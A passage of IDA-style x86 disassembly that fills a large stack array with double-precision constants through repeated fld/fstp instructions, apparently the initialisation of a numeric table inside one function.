		fld	ds:dbl_424A50
		fstp	[ebp+var_2060]
		fld	ds:dbl_424788
		fstp	[ebp+var_2058]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_2050]
		fld	ds:dbl_424760
		fstp	[ebp+var_2048]
		fld	ds:dbl_4245E8
		fstp	[ebp+var_2040]
		fld	ds:dbl_424B48
		fstp	[ebp+var_2038]
		fld	ds:dbl_424748
		fstp	[ebp+var_2030]
		fld	ds:dbl_424B28
		fstp	[ebp+var_2028]
		fld	ds:dbl_424898
		fstp	[ebp+var_2020]
		fld	ds:dbl_424AD0
		fstp	[ebp+var_2018]
		fld	ds:dbl_424B58
		fstp	[ebp+var_2010]
		fld	ds:dbl_424B18
		fstp	[ebp+var_2008]
		fld	ds:dbl_4248A8
		fstp	[ebp+var_2000]
		fld	ds:dbl_4244F0
		fstp	[ebp+var_1FF8]
		fld	ds:dbl_424700
		fstp	[ebp+var_1FF0]
		fld	ds:dbl_4247E0
		fstp	[ebp+var_1FE8]
		fld	ds:dbl_424940
		fstp	[ebp+var_1FE0]
		fld	ds:dbl_4248A8
		fstp	[ebp+var_1FD8]
		fld	ds:dbl_424558
		fstp	[ebp+var_1FD0]
		fld	ds:dbl_424A40
		fstp	[ebp+var_1FC8]
		fld	ds:dbl_424810
		fstp	[ebp+var_1FC0]
		fld1
		fstp	[ebp+var_1FB8]
		fld	ds:dbl_424518
		fstp	[ebp+var_1FB0]
		fld	ds:dbl_4248C8
		fstp	[ebp+var_1FA8]
		fld	ds:dbl_424640
		fstp	[ebp+var_1FA0]
		fld	ds:dbl_4246F0
		fstp	[ebp+var_1F98]
		fld	ds:dbl_424648
		fstp	[ebp+var_1F90]
		fld	ds:dbl_424610
		fstp	[ebp+var_1F88]
		fld	ds:dbl_4246B0
		fstp	[ebp+var_1F80]
		fld	ds:dbl_424C20
		fstp	[ebp+var_1F78]
		fld	ds:dbl_424A50
		fstp	[ebp+var_1F70]
		fld	ds:dbl_4248C0
		fstp	[ebp+var_1F68]
		fld	ds:dbl_424450
		fstp	[ebp+var_1F60]
		fld	ds:dbl_4245A0
		fstp	[ebp+var_1F58]
		fld	ds:dbl_424AF0
		fstp	[ebp+var_1F50]
		fld	ds:dbl_4246E8
		fstp	[ebp+var_1F48]
		fld	ds:dbl_424A90
		fstp	[ebp+var_1F40]
		fld	ds:dbl_424540
		fstp	[ebp+var_1F38]
		fld	ds:dbl_424968
		fstp	[ebp+var_1F30]
		fld	ds:dbl_4248C0
		fstp	[ebp+var_1F28]
		fld	ds:dbl_424960
		fstp	[ebp+var_1F20]
		fld	ds:dbl_424660
		fstp	[ebp+var_1F18]
		fld	ds:dbl_424BA0
		fstp	[ebp+var_1F10]
		fld	ds:dbl_424530
		fstp	[ebp+var_1F08]
		fld	ds:dbl_424A08
		fstp	[ebp+var_1F00]
		fld	ds:dbl_424B18
		fstp	[ebp+var_1EF8]
		fld	ds:dbl_4247D8
		fstp	[ebp+var_1EF0]
		fld	ds:dbl_424540
		fstp	[ebp+var_1EE8]
		fld	ds:dbl_424518
		fstp	[ebp+var_1EE0]
		fld	ds:dbl_424578
		fstp	[ebp+var_1ED8]
		fld	ds:dbl_424A20
		fstp	[ebp+var_1ED0]
		fld	ds:dbl_424718
		fstp	[ebp+var_1EC8]
		fld	ds:dbl_4245A0
		fstp	[ebp+var_1EC0]
		fld	ds:dbl_4248D8
		fstp	[ebp+var_1EB8]
		fld	ds:dbl_424708
		fstp	[ebp+var_1EB0]
		fld	ds:dbl_424768
		fstp	[ebp+var_1EA8]
		fld	ds:dbl_424BD0
		fstp	[ebp+var_1EA0]
		fld	ds:dbl_424620
		fstp	[ebp+var_1E98]
		fld	ds:dbl_4246B8
		fstp	[ebp+var_1E90]
		fld	ds:dbl_4245D0
		fstp	[ebp+var_1E88]
		fld	ds:dbl_4244E8
		fstp	[ebp+var_1E80]
		fld	ds:dbl_424690
		fstp	[ebp+var_1E78]
		fld	ds:dbl_424900
		fstp	[ebp+var_1E70]
		fld	ds:dbl_424A50
		fstp	[ebp+var_1E68]
		fld	ds:dbl_4246C0
		fstp	[ebp+var_1E60]
		fld	ds:dbl_4246B8
		fstp	[ebp+var_1E58]
		fld	ds:dbl_4246A8
		fstp	[ebp+var_1E50]
		fld	ds:dbl_424760
		fstp	[ebp+var_1E48]
		fld	ds:dbl_424930
		fstp	[ebp+var_1E40]
		fld	ds:dbl_424B78
		fstp	[ebp+var_1E38]
		fld	ds:dbl_424588
		fstp	[ebp+var_1E30]
		fld	ds:dbl_4249C0
		fstp	[ebp+var_1E28]
		fld	ds:dbl_424A18
		fstp	[ebp+var_1E20]
		fld	ds:dbl_4247C8
		fstp	[ebp+var_1E18]
		fld	ds:dbl_424650
		fstp	[ebp+var_1E10]
		fld	ds:dbl_424520
		fstp	[ebp+var_1E08]
		fld	ds:dbl_424950
		fstp	[ebp+var_1E00]
		fld	ds:dbl_424B18
		fstp	[ebp+var_1DF8]
		fldz
		fstp	[ebp+var_1DF0]
		fld	ds:dbl_424860
		fstp	[ebp+var_1DE8]
		fld	ds:dbl_424900
		fstp	[ebp+var_1DE0]
		fld	ds:dbl_4248B8
		fstp	[ebp+var_1DD8]
		fld	ds:dbl_424768
		fstp	[ebp+var_1DD0]
		fld	ds:dbl_424740
		fstp	[ebp+var_1DC8]
		fld	ds:dbl_4249D8
		fstp	[ebp+var_1DC0]
		fld	ds:dbl_4249C0
		fstp	[ebp+var_1DB8]
		fld	ds:dbl_424780
		fstp	[ebp+var_1DB0]
		fld	ds:dbl_424AD0
		fstp	[ebp+var_1DA8]
		fld	ds:dbl_424878
		fstp	[ebp+var_1DA0]
		fld	ds:dbl_424898
		fstp	[ebp+var_1D98]
		fld	ds:dbl_424900
		fstp	[ebp+var_1D90]
		fld	ds:dbl_424C18
		fstp	[ebp+var_1D88]
		fld	ds:dbl_424BE0
		fstp	[ebp+var_1D80]
		fld	ds:dbl_424490
		fstp	[ebp+var_1D78]
		fld	ds:dbl_424BE8
		fstp	[ebp+var_1D70]
		fld	ds:dbl_4249F8
		fstp	[ebp+var_1D68]
		fld	ds:dbl_424960
		fstp	[ebp+var_1D60]
		fld	ds:dbl_4244E0
		fstp	[ebp+var_1D58]
		fld	ds:dbl_4244E0
		fstp	[ebp+var_1D50]
		fld	ds:dbl_424788
		fstp	[ebp+var_1D48]
		fld	ds:dbl_4245B0
		fstp	[ebp+var_1D40]
		fld	ds:dbl_424958
		fstp	[ebp+var_1D38]
		fld	ds:dbl_424650
		fstp	[ebp+var_1D30]
		fld	ds:dbl_424A18
		fstp	[ebp+var_1D28]
		fld	ds:dbl_424478
		fstp	[ebp+var_1D20]
		fld	ds:dbl_424BF8
		fstp	[ebp+var_1D18]
		fld	ds:dbl_424830
		fstp	[ebp+var_1D10]
		fld	ds:dbl_424488
		fstp	[ebp+var_1D08]
		fld	ds:dbl_424C28
		fstp	[ebp+var_1D00]
		fld	ds:dbl_424678
		fstp	[ebp+var_1CF8]
		fld	ds:dbl_424A50
		fstp	[ebp+var_1CF0]
		fld	ds:dbl_4248D0
		fstp	[ebp+var_1CE8]
		fld	ds:dbl_424598
		fstp	[ebp+var_1CE0]
		fld	ds:dbl_424A80
		fstp	[ebp+var_1CD8]
		fld	ds:dbl_424848
		fstp	[ebp+var_1CD0]
		fld	ds:dbl_4249B0
		fstp	[ebp+var_1CC8]
		fld	ds:dbl_424A18
		fstp	[ebp+var_1CC0]
		fld	ds:dbl_424A10
		fstp	[ebp+var_1CB8]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_1CB0]
		fld	ds:dbl_424608
		fstp	[ebp+var_1CA8]
		fld	ds:dbl_424800
		fstp	[ebp+var_1CA0]
		fld	ds:dbl_424B70
		fstp	[ebp+var_1C98]
		fld	ds:dbl_424480
		fstp	[ebp+var_1C90]
		fld1
		fstp	[ebp+var_1C88]
		fld	ds:dbl_424AE0
		fstp	[ebp+var_1C80]
		fld	ds:dbl_424740
		fstp	[ebp+var_1C78]
		fld	ds:dbl_424AB0
		fstp	[ebp+var_1C70]
		fld	ds:dbl_424930
		fstp	[ebp+var_1C68]
		fld	ds:dbl_424448
		fstp	[ebp+var_1C60]
		fld	ds:dbl_424BF8
		fstp	[ebp+var_1C58]
		fld	ds:dbl_424AF0
		fstp	[ebp+var_1C50]
		fld	ds:dbl_4249C8
		fstp	[ebp+var_1C48]
		fld	ds:dbl_424600
		fstp	[ebp+var_1C40]
		fld	ds:dbl_4249D8
		fstp	[ebp+var_1C38]
		fld	ds:dbl_424B58
		fstp	[ebp+var_1C30]
		fld	ds:dbl_424630
		fstp	[ebp+var_1C28]
		fld	ds:dbl_424AE8
		fstp	[ebp+var_1C20]
		fld	ds:dbl_424B30
		fstp	[ebp+var_1C18]
		fld	ds:dbl_424980
		fstp	[ebp+var_1C10]
		fld	ds:dbl_424A38
		fstp	[ebp+var_1C08]
		fld	ds:dbl_4244D0
		fstp	[ebp+var_1C00]
		fld	ds:dbl_4244F8
		fstp	[ebp+var_1BF8]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_1BF0]
		fld	ds:dbl_424878
		fstp	[ebp+var_1BE8]
		fld	ds:dbl_424B50
		fstp	[ebp+var_1BE0]
		fld	ds:dbl_424490
		fstp	[ebp+var_1BD8]
		fld	ds:dbl_424928
		fstp	[ebp+var_1BD0]
		fld	ds:dbl_424560
		fstp	[ebp+var_1BC8]
		fld	ds:dbl_424A40
		fstp	[ebp+var_1BC0]
		fld	ds:dbl_424950
		fstp	[ebp+var_1BB8]
		fld	ds:dbl_424870
		fstp	[ebp+var_1BB0]
		fld	ds:dbl_424848
		fstp	[ebp+var_1BA8]
		fld	ds:dbl_424B30
		fstp	[ebp+var_1BA0]
		fld	ds:dbl_424C10
		fstp	[ebp+var_1B98]
		fld	ds:dbl_4245E0
		fstp	[ebp+var_1B90]
		fld	ds:dbl_424998
		fstp	[ebp+var_1B88]
		fld	ds:dbl_4248A0
		fstp	[ebp+var_1B80]
		fld	ds:dbl_4249F0
		fstp	[ebp+var_1B78]
		fld	ds:dbl_424A58
		fstp	[ebp+var_1B70]
		fld	ds:dbl_424488
		fstp	[ebp+var_1B68]
		fld	ds:dbl_4244D0
		fstp	[ebp+var_1B60]
		fld	ds:dbl_424A08
		fstp	[ebp+var_1B58]
		fld	ds:dbl_424888
		fstp	[ebp+var_1B50]
		fld	ds:dbl_424720
		fstp	[ebp+var_1B48]
		fld	ds:dbl_424AA0
		fstp	[ebp+var_1B40]
		fld	ds:dbl_4246D8
		fstp	[ebp+var_1B38]
		fld	ds:dbl_424BF8
		fstp	[ebp+var_1B30]
		fld	ds:dbl_424810
		fstp	[ebp+var_1B28]
		fld	ds:dbl_424A40
		fstp	[ebp+var_1B20]
		fld	ds:dbl_4249B8
		fstp	[ebp+var_1B18]
		fld	ds:dbl_424AE8
		fstp	[ebp+var_1B10]
		fld	ds:dbl_4249E0
		fstp	[ebp+var_1B08]
		fld	ds:dbl_424600
		fstp	[ebp+var_1B00]
		fld	ds:dbl_424AE0
		fstp	[ebp+var_1AF8]
		fld	ds:dbl_424668
		fstp	[ebp+var_1AF0]
		fld	ds:dbl_4248F0
		fstp	[ebp+var_1AE8]
		fld	ds:dbl_4249E0
		fstp	[ebp+var_1AE0]
		fld	ds:dbl_424BF0
		fstp	[ebp+var_1AD8]
		fld	ds:dbl_424918
		fstp	[ebp+var_1AD0]
		fld	ds:dbl_424508
		fstp	[ebp+var_1AC8]
		fld	ds:dbl_424618
		fstp	[ebp+var_1AC0]
		fld	ds:dbl_424920
		fstp	[ebp+var_1AB8]
		fld	ds:dbl_424958
		fstp	[ebp+var_1AB0]
		fld	ds:dbl_424450
		fstp	[ebp+var_1AA8]
		fld	ds:dbl_4244C8
		fstp	[ebp+var_1AA0]
		fld	ds:dbl_424748
		fstp	[ebp+var_1A98]
		fld	ds:dbl_424758
		fstp	[ebp+var_1A90]
		fld	ds:dbl_424540
		fstp	[ebp+var_1A88]
		fld	ds:dbl_424788
		fstp	[ebp+var_1A80]
		fld	ds:dbl_424498
		fstp	[ebp+var_1A78]
		fld	ds:dbl_4249B0
		fstp	[ebp+var_1A70]
		fld	ds:dbl_4244E0
		fstp	[ebp+var_1A68]
		fld	ds:dbl_424660
		fstp	[ebp+var_1A60]
		fld	ds:dbl_424C10
		fstp	[ebp+var_1A58]
		fld	ds:dbl_424998
		fstp	[ebp+var_1A50]
		fld	ds:dbl_424B18
		fstp	[ebp+var_1A48]
		fld	ds:dbl_424BA8
		fstp	[ebp+var_1A40]
		fld	ds:dbl_424578
		fstp	[ebp+var_1A38]
		fld	ds:dbl_424918
		fstp	[ebp+var_1A30]
		fld	ds:dbl_4248B8
		fstp	[ebp+var_1A28]
		fld	ds:dbl_424668
		fstp	[ebp+var_1A20]
		fld	ds:dbl_424A58
		fstp	[ebp+var_1A18]
		fld	ds:dbl_4245E0
		fstp	[ebp+var_1A10]
		fld	ds:dbl_424470
		fstp	[ebp+var_1A08]
		fld	ds:dbl_424AF8
		fstp	[ebp+var_1A00]
		fld	ds:dbl_424AA0
		fstp	[ebp+var_19F8]
		fld	ds:dbl_4245D0
		fstp	[ebp+var_19F0]
		fld	ds:dbl_424640
		fstp	[ebp+var_19E8]
		fld	ds:dbl_4245E0
		fstp	[ebp+var_19E0]
		fld	ds:dbl_424B30
		fstp	[ebp+var_19D8]
		fld	ds:dbl_424740
		fstp	[ebp+var_19D0]
		fld	ds:dbl_424AA8
		fstp	[ebp+var_19C8]
		fld	ds:dbl_424670
		fstp	[ebp+var_19C0]
		fld	ds:dbl_4247F0
		fstp	[ebp+var_19B8]
		fld	ds:dbl_424758
		fstp	[ebp+var_19B0]
		fld	ds:dbl_4244D8
		fstp	[ebp+var_19A8]
		fld	ds:dbl_424760
		fstp	[ebp+var_19A0]
		fld	ds:dbl_4245E0
		fstp	[ebp+var_1998]
		fld	ds:dbl_424960
		fstp	[ebp+var_1990]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_1988]
		fld	ds:dbl_424498
		fstp	[ebp+var_1980]
		fld	ds:dbl_4247B8
		fstp	[ebp+var_1978]
		fld	ds:dbl_424888
		fstp	[ebp+var_1970]
		fld	ds:dbl_424998
		fstp	[ebp+var_1968]
		fld	ds:dbl_424A78
		fstp	[ebp+var_1960]
		fld	ds:dbl_4245B0
		fstp	[ebp+var_1958]
		fld	ds:dbl_424A48
		fstp	[ebp+var_1950]
		fld	ds:dbl_424860
		fstp	[ebp+var_1948]
		fld	ds:dbl_4244E0
		fstp	[ebp+var_1940]
		fld	ds:dbl_424968
		fstp	[ebp+var_1938]
		fld	ds:dbl_4249B0
		fstp	[ebp+var_1930]
		fld	ds:dbl_424538
		fstp	[ebp+var_1928]
		fld	ds:dbl_4248A0
		fstp	[ebp+var_1920]
		fld	ds:dbl_4248B0
		fstp	[ebp+var_1918]
		fld	ds:dbl_424B88
		fstp	[ebp+var_1910]
		fld	ds:dbl_424758
		fstp	[ebp+var_1908]
		fld	ds:dbl_4245B0
		fstp	[ebp+var_1900]
		fld	ds:dbl_424B58
		fstp	[ebp+var_18F8]
		fld	ds:dbl_424740
		fstp	[ebp+var_18F0]
		fldz
		fstp	[ebp+var_18E8]
		fld	ds:dbl_424720
		fstp	[ebp+var_18E0]
		fld	ds:dbl_424528
		fstp	[ebp+var_18D8]
		fld	ds:dbl_424AB0
		fstp	[ebp+var_18D0]
		fld	ds:dbl_424910
		fstp	[ebp+var_18C8]
		fld	ds:dbl_424650
		fstp	[ebp+var_18C0]
		fld	ds:dbl_424598
		fstp	[ebp+var_18B8]
		fld	ds:dbl_424AB8
		fstp	[ebp+var_18B0]
		fld	ds:dbl_424728
		fstp	[ebp+var_18A8]
		fld	ds:dbl_424778
		fstp	[ebp+var_18A0]
		fld	ds:dbl_424A08
		fstp	[ebp+var_1898]
		fld	ds:dbl_424B48
		fstp	[ebp+var_1890]
		fld	ds:dbl_424888
		fstp	[ebp+var_1888]
		fld	ds:dbl_424AC0
		fstp	[ebp+var_1880]
		fld	ds:dbl_4246E0
		fstp	[ebp+var_1878]
		fld	ds:dbl_424950
		fstp	[ebp+var_1870]
		fld	ds:dbl_424918
		fstp	[ebp+var_1868]
		fld	ds:dbl_4248B8
		fstp	[ebp+var_1860]
		fld	ds:dbl_4245C8
		fstp	[ebp+var_1858]
		fld	ds:dbl_424440
		fstp	[ebp+var_1850]
		fld	ds:dbl_4249E8
		fstp	[ebp+var_1848]
		fld	ds:dbl_424B70
		fstp	[ebp+var_1840]
		fld	ds:dbl_424528
		fstp	[ebp+var_1838]
		fld	ds:dbl_424A28
		fstp	[ebp+var_1830]
		fld	ds:dbl_424948
		fstp	[ebp+var_1828]
		fld	ds:dbl_424950
		fstp	[ebp+var_1820]
		fld	ds:dbl_424980
		fstp	[ebp+var_1818]
		fld	ds:dbl_424AF8
		fstp	[ebp+var_1810]
		fld	ds:dbl_4247C8
		fstp	[ebp+var_1808]
		fld	ds:dbl_4247C8
		fstp	[ebp+var_1800]
		fld	ds:dbl_424AC8
		fstp	[ebp+var_17F8]
		fld	ds:dbl_424500
		fstp	[ebp+var_17F0]
		fld	ds:dbl_424A60
		fstp	[ebp+var_17E8]
		fld	ds:dbl_424B60
		fstp	[ebp+var_17E0]
		fld	ds:dbl_424930
		fstp	[ebp+var_17D8]
		fld	ds:dbl_4244D8
		fstp	[ebp+var_17D0]
		fld	ds:dbl_424B50
		fstp	[ebp+var_17C8]
		fld	ds:dbl_424480
		fstp	[ebp+var_17C0]
		fld	ds:dbl_424768
		fstp	[ebp+var_17B8]
		fld	ds:dbl_424460
		fstp	[ebp+var_17B0]
		fld	ds:dbl_424980
		fstp	[ebp+var_17A8]
		fld	ds:dbl_424A90
		fstp	[ebp+var_17A0]
		fld	ds:dbl_4245D0
		fstp	[ebp+var_1798]
		fld	ds:dbl_4249D8
		fstp	[ebp+var_1790]
		fld	ds:dbl_4249D0
		fstp	[ebp+var_1788]
		fld	ds:dbl_424478
		fstp	[ebp+var_1780]
		fld	ds:dbl_424570
		fstp	[ebp+var_1778]
		fld	ds:dbl_424B88
		fstp	[ebp+var_1770]
		fld	ds:dbl_4245B0
		fstp	[ebp+var_1768]
		fld	ds:dbl_424BF0
		fstp	[ebp+var_1760]
		fld	ds:dbl_4244A8
		fstp	[ebp+var_1758]
		fld	ds:dbl_424758
		fstp	[ebp+var_1750]
		fld	ds:dbl_424C20
		fstp	[ebp+var_1748]
		fld	ds:dbl_424A68
		fstp	[ebp+var_1740]
		fld	ds:dbl_4244E8
		fstp	[ebp+var_1738]
		fld	ds:dbl_424710
		fstp	[ebp+var_1730]
		fld	ds:dbl_424A30
		fstp	[ebp+var_1728]
		fld	ds:dbl_424588
		fstp	[ebp+var_1720]
		fld	ds:dbl_424850
		fstp	[ebp+var_1718]
		fld	ds:dbl_4244D0
		fstp	[ebp+var_1710]
		fld	ds:dbl_424450
		fstp	[ebp+var_1708]
		fld	ds:dbl_424A60
		fstp	[ebp+var_1700]
		fld	ds:dbl_424990
		fstp	[ebp+var_16F8]
		fld	ds:dbl_424908
		fstp	[ebp+var_16F0]
		fld	ds:dbl_424BA8
		fstp	[ebp+var_16E8]
		fld	ds:dbl_4244F8
		fstp	[ebp+var_16E0]
		fld	ds:dbl_424498
		fstp	[ebp+var_16D8]
		fld	ds:dbl_424868
		fstp	[ebp+var_16D0]
		fld	ds:dbl_424910
		fstp	[ebp+var_16C8]
		fld	ds:dbl_424910
		fstp	[ebp+var_16C0]
		fld	ds:dbl_424BD8
		fstp	[ebp+var_16B8]
		fld	ds:dbl_424548
		fstp	[ebp+var_16B0]
		fld	ds:dbl_424AC0
		fstp	[ebp+var_16A8]
		fld	ds:dbl_424978
		fstp	[ebp+var_16A0]
		fld	ds:dbl_424A20
		fstp	[ebp+var_1698]
		fld	ds:dbl_424878
		fstp	[ebp+var_1690]
		fld	ds:dbl_424638
		fstp	[ebp+var_1688]
		fld	ds:dbl_424A88
		fstp	[ebp+var_1680]
		fld	ds:dbl_424808
		fstp	[ebp+var_1678]
		fld	ds:dbl_424638
		fstp	[ebp+var_1670]
		fld	ds:dbl_424830
		fstp	[ebp+var_1668]
		fld	ds:dbl_424A58
		fstp	[ebp+var_1660]
		fld	ds:dbl_424490
		fstp	[ebp+var_1658]
		fld	ds:dbl_424C28
		fstp	[ebp+var_1650]
		fld	ds:dbl_424550
		fstp	[ebp+var_1648]
		fld	ds:dbl_4245B8
		fstp	[ebp+var_1640]
		fld	ds:dbl_4248E8
		fstp	[ebp+var_1638]
		fld	ds:dbl_424770
		fstp	[ebp+var_1630]
		fld	ds:dbl_424530
		fstp	[ebp+var_1628]
		fld	ds:dbl_424748
		fstp	[ebp+var_1620]
		fld	ds:dbl_4247D0
		fstp	[ebp+var_1618]
		fld	ds:dbl_424900
		fstp	[ebp+var_1610]
		fld	ds:dbl_424560
		fstp	[ebp+var_1608]
		fld	ds:dbl_424AE0
		fstp	[ebp+var_1600]
		fld	ds:dbl_424B60
		fstp	[ebp+var_15F8]
		fld	ds:dbl_424788
		fstp	[ebp+var_15F0]
		fld	ds:dbl_424858
		fstp	[ebp+var_15E8]
		fld	ds:dbl_424A20
		fstp	[ebp+var_15E0]
		fld	ds:dbl_424948
		fstp	[ebp+var_15D8]
		fld	ds:dbl_424960
		fstp	[ebp+var_15D0]
		fld	ds:dbl_424BD0
		fstp	[ebp+var_15C8]
		fld	ds:dbl_4246A8
		fstp	[ebp+var_15C0]
		fld	ds:dbl_424920
		fstp	[ebp+var_15B8]
		fld	ds:dbl_424AF0
		fstp	[ebp+var_15B0]
		fld	ds:dbl_424B18
		fstp	[ebp+var_15A8]
		fld	ds:dbl_424490
		fstp	[ebp+var_15A0]
		fld	ds:dbl_4244B8
		fstp	[ebp+var_1598]
		fld	ds:dbl_424888
		fstp	[ebp+var_1590]
		fld	ds:dbl_424BD8
		fstp	[ebp+var_1588]
		fld	ds:dbl_4248F0
		fstp	[ebp+var_1580]
		fld	ds:dbl_424738
		fstp	[ebp+var_1578]
		fld	ds:dbl_4249C0
		fstp	[ebp+var_1570]
		fld	ds:dbl_4249B8
		fstp	[ebp+var_1568]
		fld	ds:dbl_424B78
		fstp	[ebp+var_1560]
		fld	ds:dbl_4249D8
		fstp	[ebp+var_1558]
		fld	ds:dbl_4249C0
		fstp	[ebp+var_1550]
		fld	ds:dbl_424BE8
		fstp	[ebp+var_1548]
		fld	ds:dbl_424C00
		fstp	[ebp+var_1540]
		fld	ds:dbl_4249E0
		fstp	[ebp+var_1538]
		fld	ds:dbl_424A78
		fstp	[ebp+var_1530]
		fld	ds:dbl_424478
		fstp	[ebp+var_1528]
		fld	ds:dbl_424C00
		fstp	[ebp+var_1520]
		fld	ds:dbl_424750
		fstp	[ebp+var_1518]
		fld	ds:dbl_4244A0
		fstp	[ebp+var_1510]
		fld	ds:dbl_424458
		fstp	[ebp+var_1508]
		fld	ds:dbl_424A48
		fstp	[ebp+var_1500]
		fld	ds:dbl_424B88
		fstp	[ebp+var_14F8]
		fld	ds:dbl_424700
		fstp	[ebp+var_14F0]
		fld	ds:dbl_424A30
		fstp	[ebp+var_14E8]
		fld	ds:dbl_424888
		fstp	[ebp+var_14E0]
		fld	ds:dbl_424740
		fstp	[ebp+var_14D8]
		fld	ds:dbl_4245A8
		fstp	[ebp+var_14D0]
		fld	ds:dbl_4249F0
		fstp	[ebp+var_14C8]
		fld	ds:dbl_424B60
		fstp	[ebp+var_14C0]
		fld	ds:dbl_424AA8
		fstp	[ebp+var_14B8]
		fld	ds:dbl_4245F0
		fstp	[ebp+var_14B0]
		fld	ds:dbl_424998
		fstp	[ebp+var_14A8]
		fld	ds:dbl_4247A0
		fstp	[ebp+var_14A0]
		fld	ds:dbl_4248A0
		fstp	[ebp+var_1498]
		fld	ds:dbl_4246F8
		fstp	[ebp+var_1490]
		fldz
		fstp	[ebp+var_1488]
		fld	ds:dbl_424950
		fstp	[ebp+var_1480]
		fld	ds:dbl_424AD8
		fstp	[ebp+var_1478]
		fld	ds:dbl_424480
		fstp	[ebp+var_1470]
		fld	ds:dbl_4245F8
		fstp	[ebp+var_1468]
		fld	ds:dbl_424AC0
		fstp	[ebp+var_1460]
		fld	ds:dbl_4249E0
		fstp	[ebp+var_1458]
		fld	ds:dbl_4247C8
		fstp	[ebp+var_1450]
		fld	ds:dbl_424990
		fstp	[ebp+var_1448]
		fld	ds:dbl_424950
		fstp	[ebp+var_1440]
		fld	ds:dbl_424960
		fstp	[ebp+var_1438]
		fld	ds:dbl_424778
		fstp	[ebp+var_1430]
		fld	ds:dbl_424558
		fstp	[ebp+var_1428]
		fld	ds:dbl_424B20
		fstp	[ebp+var_1420]
		fld	ds:dbl_424B58
		fstp	[ebp+var_1418]
		fld	ds:dbl_424840
		fstp	[ebp+var_1410]
		fld	ds:dbl_424478
		fstp	[ebp+var_1408]
		fld	ds:dbl_4249C0
		fstp	[ebp+var_1400]
		fld	ds:dbl_424520
		fstp	[ebp+var_13F8]
		fld	ds:dbl_424B10
		fstp	[ebp+var_13F0]
		fld	ds:dbl_424470
		fstp	[ebp+var_13E8]
		fld	ds:dbl_4245D8
		fstp	[ebp+var_13E0]
		fld	ds:dbl_424828
		fstp	[ebp+var_13D8]
		fld	ds:dbl_424938
		fstp	[ebp+var_13D0]
		fld	ds:dbl_424698
		fstp	[ebp+var_13C8]
		fld	ds:dbl_424970
		fstp	[ebp+var_13C0]
		fld	ds:dbl_4246E0
		fstp	[ebp+var_13B8]
		fld	ds:dbl_424700
		fstp	[ebp+var_13B0]
		fld	ds:dbl_4248B0
		fstp	[ebp+var_13A8]
		fld	ds:dbl_4248A8
		fstp	[ebp+var_13A0]
		fld	ds:dbl_424830
		fstp	[ebp+var_1398]
		fld	ds:dbl_424810
		fstp	[ebp+var_1390]
		fld	ds:dbl_424678
		fstp	[ebp+var_1388]
		fld	ds:dbl_4245A8
		fstp	[ebp+var_1380]
		fld	ds:dbl_424800
		fstp	[ebp+var_1378]
		fld	ds:dbl_4247C8
		fstp	[ebp+var_1370]
		fld	ds:dbl_4246A0
		fstp	[ebp+var_1368]
		fld	ds:dbl_424610
		fstp	[ebp+var_1360]
		fld	ds:dbl_424870
		fstp	[ebp+var_1358]
		fld	ds:dbl_424698
		fstp	[ebp+var_1350]
		fld	ds:dbl_424BB0
		fstp	[ebp+var_1348]
		fld	ds:dbl_424C28
		fstp	[ebp+var_1340]
		fld	ds:dbl_4249E8
		fstp	[ebp+var_1338]
		fld	ds:dbl_424698
		fstp	[ebp+var_1330]
		fld	ds:dbl_424BC8
		fstp	[ebp+var_1328]
		fld	ds:dbl_424480
		fstp	[ebp+var_1320]
		fld	ds:dbl_4247A0
		fstp	[ebp+var_1318]
		fld	ds:dbl_424A88
		fstp	[ebp+var_1310]
		fld	ds:dbl_4244B8
		fstp	[ebp+var_1308]
		fld	ds:dbl_424BC0
		fstp	[ebp+var_1300]
		fld	ds:dbl_4249A8
		fstp	[ebp+var_12F8]
		fld	ds:dbl_424C18
		fstp	[ebp+var_12F0]
		fld	ds:dbl_424498
		fstp	[ebp+var_12E8]
		fld	ds:dbl_4249F8
		fstp	[ebp+var_12E0]
		fld	ds:dbl_424560
		fstp	[ebp+var_12D8]
		fld	ds:dbl_424590
		fstp	[ebp+var_12D0]
		fld	ds:dbl_4248B0
		fstp	[ebp+var_12C8]
		fld	ds:dbl_4249A8
		fstp	[ebp+var_12C0]
		fld	ds:dbl_424B58
		fstp	[ebp+var_12B8]
		fld	ds:dbl_4249C0
		fstp	[ebp+var_12B0]
		fld	ds:dbl_424920
		fstp	[ebp+var_12A8]
		fldz
		fstp	[ebp+var_12A0]
		fld	ds:dbl_424600
		fstp	[ebp+var_1298]
		fld	ds:dbl_424B88
		fstp	[ebp+var_1290]
		fld	ds:dbl_424780
		fstp	[ebp+var_1288]
		fld	ds:dbl_424678
		fstp	[ebp+var_1280]
		fld	ds:dbl_4248C0
		fstp	[ebp+var_1278]
		fld	ds:dbl_424528
		fstp	[ebp+var_1270]
		fld	ds:dbl_424A78
		fstp	[ebp+var_1268]
		fld	ds:dbl_424AE8
		fstp	[ebp+var_1260]
		fld	ds:dbl_424B70
		fstp	[ebp+var_1258]
		fld	ds:dbl_424A80
		fstp	[ebp+var_1250]
		fld	ds:dbl_424C18
		fstp	[ebp+var_1248]
		fld	ds:dbl_424910
		fstp	[ebp+var_1240]
		fld	ds:dbl_4249E8
		fstp	[ebp+var_1238]
		fld	ds:dbl_424798
		fstp	[ebp+var_1230]
		fld	ds:dbl_4244D0
		fstp	[ebp+var_1228]
		fld	ds:dbl_424BD8
		fstp	[ebp+var_1220]
		fld	ds:dbl_4247F8
		fstp	[ebp+var_1218]
		fld	ds:dbl_424640
		fstp	[ebp+var_1210]
		fld	ds:dbl_424B98
		fstp	[ebp+var_1208]
		fld	ds:dbl_4245C0
		fstp	[ebp+var_1200]
		fld	ds:dbl_4248E0
		fstp	[ebp+var_11F8]
		fld	ds:dbl_424830
		fstp	[ebp+var_11F0]
		fld	ds:dbl_424430
		fstp	[ebp+var_11E8]
		fld	ds:dbl_4247C8
		fstp	[ebp+var_11E0]
		fld	ds:dbl_424508
		fstp	[ebp+var_11D8]
		fld	ds:dbl_4246B8
		fstp	[ebp+var_11D0]
		fld	ds:dbl_4248C8
		fstp	[ebp+var_11C8]
		fld	ds:dbl_424B60
		fstp	[ebp+var_11C0]
		fld	ds:dbl_424948
		fstp	[ebp+var_11B8]
		fld	ds:dbl_424C10
		fstp	[ebp+var_11B0]
		fld	ds:dbl_424988
		fstp	[ebp+var_11A8]
		fld	ds:dbl_4245D8
		fstp	[ebp+var_11A0]
		fld	ds:dbl_424B30
		fstp	[ebp+var_1198]
		fld	ds:dbl_424B48
		fstp	[ebp+var_1190]
